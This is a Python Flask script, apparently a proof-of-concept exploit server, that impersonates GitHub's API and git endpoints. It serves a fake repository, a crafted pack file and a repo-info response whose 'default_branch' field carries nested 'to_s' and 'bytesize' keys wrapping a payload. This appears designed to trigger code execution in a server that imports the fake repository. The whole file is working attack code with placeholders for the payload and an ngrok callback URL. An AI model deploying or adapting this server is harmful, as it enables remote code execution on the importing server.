from flask import Flask, request, Response, send_file, jsonify
import requests
import json
# Made by vakzz
HTTP_METHODS = [
    "GET",
    "HEAD",
    "POST",
    "PUT",
    "DELETE",
    "CONNECT",
    "OPTIONS",
    "TRACE",
    "PATCH",
]
app = Flask(__name__)

# NOTE: Update these 2 variables
PAYLOAD = ''
NGROK_URL = ''


REPO_JSON = {
    "id": 12345,
    "name": "fake",
    "full_name": "fake/name",
    "clone_url": NGROK_URL + "/vakzz/public.git",
}


@app.route("/vakzz/public.git/info/refs")
def git_refs():
    return (
        b"001e# service=git-upload-pack\n00000154b5e17b851383bcee012364d0df7b67a3c4797b73 HEAD\x00multi_ack thin-pack side-band side-band-64k ofs-delta shallow deepen-since deepen-not deepen-relative no-progress include-tag multi_ack_detailed allow-tip-sha1-in-want allow-reachable-sha1-in-want no-done symref=HEAD:refs/heads/main filter object-format=sha1 agent=git/github-g04ce7e352669\n003db5e17b851383bcee012364d0df7b67a3c4797b73 refs/heads/main\n0000",
        200,
        {"Content-Type": "application/x-git-upload-pack-advertisement"},
    )


@app.route("/vakzz/public.git/git-upload-pack", methods=["POST"])
def git_pack():
    return (
        b'0008NAK\n0023\x02Enumerating objects: 3, done.\n0022\x02Counting objects:  33% (1/3)\r0022\x02Counting objects:  66% (2/3)\r0022\x02Counting objects: 100% (3/3)\r0029\x02Counting objects: 100% (3/3), done.\n0265\x01PACK\x00\x00\x00\x02\x00\x00\x00\x03\x9a(x\x9cmR\xcbn\xa3@\x00\xbb\xf3\x15sG\xdb0\xbc\x91\xdaUg(\x05\xb6\xc9\x00i\x08io<\xc20\x84Gx\x87|\xfdv\xb7\xd7\xfaf\xcb\x96,\xd9c\x7f>\x83L\xceu\xa8\xa5\x9a\x90\xe6\xb9\x9e\xe7R\x92&r\x96f\x86b\x18\x8a.\xe6\xb1\n\xb3\x14\x8a9\xe4\xe2i,\xda\x1eD\xac\xaaX\\\x03\xdc.\x15k(x\\\xbe\x84\xe7%\xf9\xa6\x0f\xac\xc9\xdb\xdf\x00\xaa*\x94d(+*\xe0\xa1 \x08\\\xda\xd65\x1b\xc7s\x0fl6:S\x02\x1e\x9b\xb6?_\xab\xf5\x99\xb2\xb1\x98\x92\x87/\xc3\x0f1z\xa5\x03\xa3\xe0\xd7?`\xcbv\t\xf0m\x1f\xbc\xbb6A\x87po\xfd\xd79\xc0\x81e\xc0)F\x08\x9b\x08\x058\xf8Sb\xaa\x07\xe6\x1e\xbfiE){\xb3\xd4\xbb\x0bB3\r\\\xe4t\xcb\x1b\xcd\xd96W\xeac\xfe\x11\xdb\x05\x9f\xbdB\xbe\xe3\x80"\xd2H\x8f\x8e\xcc\xa4:\xf9\xdct\xc3\x88Y\xa8_.\xa7tht\xb5B\xa8\x13\x96\n\x1f\xe4jt\xe1\xea\xf9\x1f\xbcVf7\x85\x85\xe3\xb1\xd9\x96\xedHt\x0e\xd8\xd7y\x8b\xe4\xcfY\xd4\x93\xbb\xb8\xf9\x14=\xff\x10D)\x8e\x87Lz\xado\xeb2m2\xe8\xf4W\x8a\x02\xc2\xf6u\x946\xcb\xf5\xd4C\xcb\xb6\xadN%\xd3]\xe5@:%\x1a\x81\xea\xbe\xc6\xd4\x98\x1a\xf1\x8f\xb4+w\x06,nf\xca*\x1a\x94+\xf3\xa2\xb5U\xc5\xa3\x7f\xaaH\x1b_\xc2;<\x1en\x1bB\x19\xcd\xb2\xc5\xe0\'\x0e\x08\xda\x18#\'\xf7/\xba\xb5\xa7\x86\xe0\xf1\xb50k\xc7\x9btK\xca\xb3I\x82\xa2\x08\xe7]%\r}7\xedb=\x0cO\xd8\x94}{%\xfd\xee\xfdP\xdd\xed\xac\xfe\xea\x80\xcd\x8b\xcb\xb7y\xbd\xf3\xb2\xaaQ\xd8@\xf8\xed\xac+\x92_F\xd2^v\x9c\xd4\x14\xca"\xac?\xae\x9b;I\xf9\xd5|K$\xcd\xec^\xc6\xc0\tm\xabFO\x1cx\xf2\x02\xe9\x95\xfb\xde\xcc"/?/\xc6\xb9\r\x1bY\\\x81\xefc\xfc\x05\xc7\xd4\xcb\x13\xa5\x02x\x9c340031Q\x08rut\xf1u\xd5\xcbMa8\x96\x983g{\xab\xdfn\x86\xe6\xe7\xc2\xd9fo\x9f~\x7f\x94\xe5\x04\x00\xe1!\x0e\xe6=x\x9cSV((M\xca\xc9L\xe6JLL\xe4\x02\x00\x1c^\x03\xfa\xd2_\xcc\xa1\xa6\x81\xa3\xb6\xeeSL\x96\t\x0c\xb4\xf8\xb7>\xa90006\x01\xf8003a\x02Total 3 (delta 0), reused 0 (delta 0), pack-reused 0\n0000',
        200,
        {"Content-Type": "application/x-git-upload-pack-result"},
    )


@app.before_request
def log_request():
    app.logger.debug("Request Path %s", request.path)
    app.logger.debug("Request Data %s", request.data)
    return None


@app.route("/repositories/12345")
def repo():
    return jsonify(REPO_JSON)


@app.route("/api/v3/repositories/12345")
def repo_legacy():
    return jsonify(REPO_JSON)


@app.route("/api/v3/repos/fake/name")
def repo_info():
    return jsonify(
        {
            "default_branch": {
                "to_s": {
                    "to_s": PAYLOAD,
                    "bytesize": 3,
                }
            }
        }
    )


@app.route("/api/v3/rate_limit")
def rate_limit():
    return (
        jsonify({}),
        200,
        {"X-RateLimit-Limit": "100000", "X-RateLimit-Remaining": "100000"},
    )


@app.route("/", defaults={"path": ""}, methods=HTTP_METHODS)
@app.route("/<path:path>", methods=HTTP_METHODS)
def proxy(path):
    return jsonify({})
